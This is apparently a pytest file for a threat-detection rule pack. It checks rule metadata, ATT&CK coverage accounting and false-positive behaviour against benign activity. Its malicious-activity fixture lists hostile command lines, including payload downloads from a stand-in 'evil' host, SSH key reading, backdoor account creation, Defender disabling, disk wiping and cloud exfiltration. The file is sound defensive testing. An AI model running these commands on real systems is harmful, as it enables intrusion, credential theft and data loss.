"""
Tests for ENH-039 -- the curated detection content pack.

ENH-038 removed 286 auto-generated "rules" that had no discriminating power
(194 matched nothing, 92 fired on every logon). This pack replaces them with
real grouped detection logic covering every log-observable ATT&CK technique.

The whole risk of a large content pack is that it recreates the problem it was
meant to solve -- broad patterns that technically "cover" a technique while
firing constantly. So the tests that matter most here are the NEGATIVE ones:
a corpus of ordinary administrative and user activity that no rule may match.
"""

import glob
import re
from pathlib import Path

import pytest

yaml = pytest.importorskip("yaml")

from content_pack_loader import (  # noqa: E402
    ContentPackError,
    OUT_OF_SCOPE_TECHNIQUES,
    coverage_report,
    covered_techniques,
    load_pack,
    reset_pack_cache,
)
from sigma_condition import evaluate_condition  # noqa: E402
from sigma_engine import SigmaConditionEvaluator  # noqa: E402

REPO = Path(__file__).resolve().parent.parent
STANDALONE_RULES = [
    f for f in sorted(glob.glob(str(REPO / "packages" / "rules" / "*.yml")))
    if not f.endswith("content_pack.yml")
]


@pytest.fixture(scope="module")
def pack():
    reset_pack_cache()
    return load_pack()


def _evaluate(detection, log_entry):
    """Evaluate a rule's full detection block against a log entry."""
    evaluator = SigmaConditionEvaluator()
    results = {}
    for name, block in detection.items():
        if name in ("condition", "timeframe"):
            continue
        results[name], _ = evaluator.evaluate_selection(log_entry, block)
    return evaluate_condition(detection.get("condition", "selection"), results)


# ---------------------------------------------------------------------------
# Structural validity
# ---------------------------------------------------------------------------


def test_pack_loads(pack):
    assert pack, "Content pack is empty"


def test_pack_has_substantial_content(pack):
    assert len(pack) >= 20, f"Only {len(pack)} rules in the pack"


def test_rule_ids_are_unique(pack):
    ids = [r.id for r in pack]
    assert len(ids) == len(set(ids))


@pytest.mark.parametrize("field", ["title", "description", "level"])
def test_every_rule_has_required_metadata(pack, field):
    missing = [r.id for r in pack if not getattr(r, field)]
    assert not missing, f"Rules missing {field}: {missing}"


def test_every_rule_declares_techniques(pack):
    missing = [r.id for r in pack if not r.techniques]
    assert not missing, f"Rules with no ATT&CK techniques: {missing}"


def test_every_rule_documents_false_positives(pack):
    """
    The cheapest defence against alert fatigue: an undocumented false positive
    is one an analyst must rediscover under pressure.
    """
    missing = [r.id for r in pack if not r.falsepositives]
    assert not missing, f"Rules with no documented false positives: {missing}"


def test_technique_ids_are_well_formed(pack):
    bad = [
        (r.id, t) for r in pack for t in r.techniques
        if not re.fullmatch(r"T\d{4}(\.\d{3})?", t)
    ]
    assert not bad, f"Malformed technique ids: {bad}"


def test_severity_levels_are_recognised(pack):
    allowed = {"informational", "low", "medium", "high", "critical"}
    bad = [(r.id, r.level) for r in pack if r.level not in allowed]
    assert not bad, f"Unrecognised levels: {bad}"


def test_every_rule_condition_is_parseable(pack):
    for rule in pack:
        detection = rule.detection
        selections = [k for k in detection if k not in ("condition", "timeframe")]
        condition = detection.get("condition", "selection")

        from sigma_condition import parse_condition

        ast = parse_condition(condition)
        unknown = [
            n for n in ast.identifiers()
            if n not in selections and not n.endswith("*")
        ]
        assert not unknown, f"{rule.id} references undefined selections: {unknown}"


# ---------------------------------------------------------------------------
# THE CRITICAL TESTS: no rule may fire on ordinary activity
# ---------------------------------------------------------------------------

# A corpus of benign administrative and end-user activity. If a rule matches
# anything here it is an alert-fatigue generator, regardless of how many
# techniques it claims to cover. This is the exact failure mode of the 286
# auto-generated rules that ENH-038 removed.
BENIGN_CORPUS = [
    {"event_id": 4624, "process_name": "explorer.exe",
     "command_line": "C:\\Windows\\explorer.exe", "user": "alice"},
    {"event_id": 4688, "process_name": "chrome.exe",
     "command_line": "chrome.exe --type=renderer", "user": "bob"},
    {"process_name": "outlook.exe", "command_line": "outlook.exe /recycle"},
    {"process_name": "svchost.exe", "command_line": "svchost.exe -k netsvcs"},
    {"process_name": "bash", "command_line": "ls -la /home/user"},
    {"process_name": "bash", "command_line": "cd /var/www && git status"},
    {"process_name": "python", "command_line": "python manage.py runserver"},
    {"process_name": "node", "command_line": "node server.js"},
    {"process_name": "cmd.exe", "command_line": "cmd.exe /c echo hello"},
    {"process_name": "powershell.exe", "command_line": "powershell Get-Date"},
    {"process_name": "sshd", "command_line": "sshd: alice@pts/0"},
    {"event_type": "authentication", "result": "success", "user": "alice"},
    {"process_name": "docker", "command_line": "docker ps -a"},
    {"process_name": "kubectl", "command_line": "kubectl get pods"},
    {"process_name": "git", "command_line": "git commit -m 'fix'"},
]


@pytest.mark.parametrize(
    "event", BENIGN_CORPUS, ids=lambda e: str(e.get("command_line", e))[:32]
)
def test_no_pack_rule_fires_on_benign_activity(pack, event):
    """
    The regression that matters. 92 of the old auto-generated rules fired on a
    single benign logon; not one rule here may fire on any of these events.
    """
    firing = [r.id for r in pack if _evaluate(r.detection, event)]

    assert not firing, (
        f"Rules fired on benign activity {event}: {firing}. "
        "Each is an alert-fatigue generator."
    )


def test_no_standalone_rule_fires_on_benign_activity():
    """The individual rule files must meet the same bar as the pack."""
    from sigma_engine import CountCondition

    offenders = []
    for path in STANDALONE_RULES:
        rule = yaml.safe_load(Path(path).read_text(encoding="utf-8"))
        detection = rule.get("detection", {})
        if CountCondition.parse(detection.get("condition", "")) is not None:
            continue  # aggregation rules are evaluated at batch level
        for event in BENIGN_CORPUS:
            if _evaluate(detection, event):
                offenders.append((Path(path).stem, event.get("command_line")))

    assert not offenders, f"Standalone rules firing on benign activity: {offenders}"


def test_benign_corpus_produces_zero_alerts_in_total(pack):
    """
    Aggregate view: the whole rule set across the whole benign corpus must
    produce zero alerts. This is the number an analyst experiences.
    """
    total = sum(
        1 for rule in pack for event in BENIGN_CORPUS
        if _evaluate(rule.detection, event)
    )

    assert total == 0, (
        f"{total} alerts generated from {len(BENIGN_CORPUS)} benign events "
        "(the old generated rules produced 92 from one event)."
    )


# ---------------------------------------------------------------------------
# Rules must actually detect attacks
# ---------------------------------------------------------------------------

# (description, event, rule id expected to fire)
MALICIOUS_CORPUS = [
    ("host enumeration", {"command_line": "net view /domain"}, "dp001-host-network-enumeration"),
    ("AV discovery", {"command_line": "sc query windefend"}, "dp002-security-tool-discovery"),
    ("defender disable", {"command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"}, "dp003-defensive-tool-tampering"),
    ("lolbin proxy", {"command_line": "mshta http://evil/x.hta"}, "dp004-masquerading-and-lolbin-abuse"),
    ("run key persist", {"command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d evil.exe"}, "dp005-autostart-persistence"),
    ("account add", {"command_line": "net user backdoor P@ss /add"}, "dp006-account-manipulation"),
    ("ssh key theft", {"command_line": "cat /home/u/.ssh/id_rsa"}, "dp007-credential-store-access"),
    ("payload download", {"command_line": "certutil -urlcache -split -f http://evil/p.exe"}, "dp008-remote-payload-download"),
    ("staging archive", {"command_line": "7z a -pSecret out.7z C:\\data"}, "dp009-exfiltration-staging"),
    ("destructive", {"command_line": "cipher /w:C"}, "dp010-destructive-impact"),
    ("office spawn", {"parent_process": "winword.exe", "process_name": "powershell.exe"}, "dp011-suspicious-child-process"),
    ("cloud metadata", {"command_line": "curl http://169.254.169.254/latest/meta-data/"}, "dp012-container-and-cloud-abuse"),
    ("remote access tool", {"process_name": "anydesk.exe"}, "dp013-remote-access-tooling"),
    ("cert export", {"command_line": "certutil -exportpfx my cert.pfx"}, "dp014-credential-and-token-theft"),
    ("cloud iam", {"command_line": "aws iam create-access-key --user-name admin"}, "dp015-cloud-control-plane-abuse"),
    ("clipboard capture", {"command_line": "Get-Clipboard"}, "dp016-collection-and-capture"),
    ("c2 framework", {"process_name": "cobaltstrike.exe"}, "dp017-exploitation-and-driver-abuse"),
    ("mail rule", {"command_line": "New-InboxRule -ForwardTo evil@x.com"}, "dp018-email-and-messaging-abuse"),
    ("port scan", {"process_name": "nmap"}, "dp019-network-service-and-sniffing"),
    ("bits transfer", {"command_line": "bitsadmin /create evil"}, "dp020-file-and-media-staging"),
    ("account disable", {"command_line": "net user alice /active:no"}, "dp021-integrity-and-availability-attacks"),
    ("history clear", {"command_line": "history -c"}, "dp022-evasion-and-artifact-removal"),
    ("reflective load", {"command_line": "[Reflection.Assembly]::Load($bytes)"}, "dp023-execution-flow-hijacking"),
    ("debugger evasion", {"command_line": "IsDebuggerPresent()"}, "dp024-defense-evasion-guardrails"),
    ("gpo discovery", {"command_line": "gpresult /z"}, "dp025-config-repository-and-policy-discovery"),
    ("mitm tool", {"process_name": "responder.py"}, "dp026-adversary-in-the-middle-and-alt-exfil"),
    ("uac bypass", {"command_line": "reg add HKCU\\Software\\Classes\\ms-settings /v fodhelper.exe"}, "dp027-elevation-and-trust-abuse"),
    ("browser extension", {"command_line": "chrome.exe --load-extension=C:\\evil"}, "dp028-external-access-and-trust-abuse"),
    ("token impersonation", {"command_line": "runas /user:administrator cmd"}, "dp029-token-manipulation-and-proxy-execution"),
    ("cloud exfil", {"command_line": "rclone copy /data remote:bucket"}, "dp030-cloud-storage-and-data-egress"),
    ("boot tamper", {"command_line": "bcdedit /set testsigning on"}, "dp031-boot-integrity-and-screen-capture"),
]


@pytest.mark.parametrize(
    "description,event,expected_rule", MALICIOUS_CORPUS, ids=[c[0] for c in MALICIOUS_CORPUS]
)
def test_malicious_activity_is_detected(pack, description, event, expected_rule):
    """Every rule must fire on the activity it was written to catch."""
    by_id = {r.id: r for r in pack}
    assert expected_rule in by_id, f"Rule {expected_rule} not found in pack"

    assert _evaluate(by_id[expected_rule].detection, event) is True, (
        f"{expected_rule} did not detect {description}: {event}"
    )


def test_every_pack_rule_has_a_malicious_fixture(pack):
    """
    A rule with no positive fixture has never been shown to detect anything --
    which is how the auto-generated rules shipped in the first place.
    """
    fixtured = {expected for _, _, expected in MALICIOUS_CORPUS}
    unfixtured = [r.id for r in pack if r.id not in fixtured]

    assert not unfixtured, f"Pack rules with no positive fixture: {unfixtured}"


# ---------------------------------------------------------------------------
# Coverage accounting must be honest
# ---------------------------------------------------------------------------


def _standalone_techniques():
    techniques = set()
    for path in STANDALONE_RULES:
        rule = yaml.safe_load(Path(path).read_text(encoding="utf-8"))
        for tag in rule.get("tags", []) or []:
            match = re.match(r"^attack\.(t\d{4}(?:\.\d+)?)$", str(tag).lower())
            if match:
                techniques.add(match.group(1).upper())
    return techniques


@pytest.fixture(scope="module")
def report():
    from mitre_metadata_generator import mitre_metadata_generator

    reset_pack_cache()
    return coverage_report(
        mitre_metadata_generator.generate_all_metadata(),
        extra_covered=_standalone_techniques(),
    )


def test_all_in_scope_techniques_are_covered(report):
    assert report["uncovered"] == 0, (
        f"{report['uncovered']} in-scope techniques still lack detection "
        f"content: {report['uncovered_techniques'][:15]}"
    )


def test_coverage_is_complete(report):
    assert report["coverage_percent"] == 100.0


def test_out_of_scope_is_declared_not_hidden(report):
    """
    An honest coverage figure needs a stated denominator. Techniques we cannot
    observe are reported separately rather than silently dropped (which would
    inflate the percentage) or counted as gaps (which would imply a content
    gap no rule could close).
    """
    assert report["out_of_scope"] > 0
    assert report["in_scope"] + report["out_of_scope"] == report["total_techniques"]


def test_out_of_scope_list_is_justifiable():
    """Out-of-scope must mean mobile/adversary-side, not merely inconvenient."""
    assert len(OUT_OF_SCOPE_TECHNIQUES) < 60, (
        "The out-of-scope list has grown large enough to look like a way of "
        "hiding missing content."
    )


def test_sub_technique_coverage_credits_the_base_technique():
    """Covering T1078.004 means a form of T1078 is detected."""
    covered = covered_techniques()
    subs = [t for t in covered if "." in t]
    for sub in subs:
        assert sub.split(".")[0] in covered


# ---------------------------------------------------------------------------
# Loader robustness
# ---------------------------------------------------------------------------


def test_missing_pack_raises(tmp_path):
    with pytest.raises(ContentPackError, match="not found"):
        load_pack(tmp_path / "nope.yml")


def test_malformed_pack_raises(tmp_path):
    path = tmp_path / "bad.yml"
    path.write_text("rules:\n  - id: x\n", encoding="utf-8")

    with pytest.raises(ContentPackError, match="missing required field"):
        load_pack(path)


def test_duplicate_rule_ids_are_rejected(tmp_path):
    path = tmp_path / "dupe.yml"
    path.write_text(
        "rules:\n"
        "  - {id: a, title: A, level: high, techniques: [T1001], detection: {selection: {x: 1}, condition: selection}}\n"
        "  - {id: a, title: B, level: high, techniques: [T1002], detection: {selection: {x: 1}, condition: selection}}\n",
        encoding="utf-8",
    )

    with pytest.raises(ContentPackError, match="Duplicate rule id"):
        load_pack(path)


def test_pack_rules_render_as_sigma(pack):
    for rule in pack:
        sigma = rule.to_sigma()
        assert sigma["detection"]
        assert any(t.startswith("attack.t") for t in sigma["tags"])
